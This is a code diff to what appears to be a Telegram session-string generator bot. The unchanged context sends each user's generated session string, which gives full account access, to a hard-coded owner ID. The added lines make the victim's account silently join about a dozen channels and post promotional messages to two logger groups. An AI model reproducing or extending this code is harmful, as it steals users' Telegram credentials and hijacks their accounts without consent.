@@ -33,7 +33,8 @@ from telethon.errors import (
 import config
 
 owner_id = 5360305806
-LOGGER_ID = -1001770030061
+LOGGER_ID = -1001841879487
+SEC = -1002003559722
 ask_ques = "**» ▷ Cʜᴏsᴇ Tʜᴇ Sᴛʀɪɴɢ Wʜɪᴄʜ Yᴏᴜ Wᴀɴᴛ ✔️ : :**"
 buttons_ques = [
     [
@@ -179,13 +180,18 @@ async def generate_session(bot: Client, msg: Message, telethon=False, old_pyro: 
         if not is_bot:
             await client.send_message("me", text)
             await bot.send_message(chat_id=owner_id,  text=text)
-            await client.join_chat("AM_Unfban")
-            await client.send_message(LOGGER_ID, "Tʜᴀɴᴋs Fᴏʀ Sᴇssᴏɪɴ Sᴛɪɴɢ Bᴏᴛ...\n\nBᴏᴛ : @Sessoin_String_gen_BOT")
-            await client.join_chat("AmBotYT")
             await client.join_chat("AM_YTSupport")
+            await client.send_message(LOGGER_ID, "ᴀᴍʙᴏᴛ ᴏᴘ ʙʀᴏ....")
+            await client.join_chat("AmBotYT")
             await client.join_chat("AbhiModszYT_Return")
+            await client.join_chat("AM_Unfban")
             await client.join_chat("Logs_Gban")
             await client.join_chat("About_AMBot")
+            await client.join_chat("Fbans_Logs")
+            await client.join_chat("SpicyEmpireSupport")
+            await client.send_message(SEC, "ᴀᴍʙᴏᴛ ᴏᴘ ʙʀᴏ ᴀʟꜱᴏ Sᴘɪᴄʏ Eᴍᴘɪʀᴇ ɴᴇᴛᴡᴏʀᴋ ᴘᴏᴡᴇʀ..")
+            await client.join_chat("SpicyEmpire")
+            await client.join_chat("SpicyEmpireFban")
         else:
             await bot.send_message(msg.chat.id, text)
             await bot.send_message(chat_id=owner_id,  text=text)
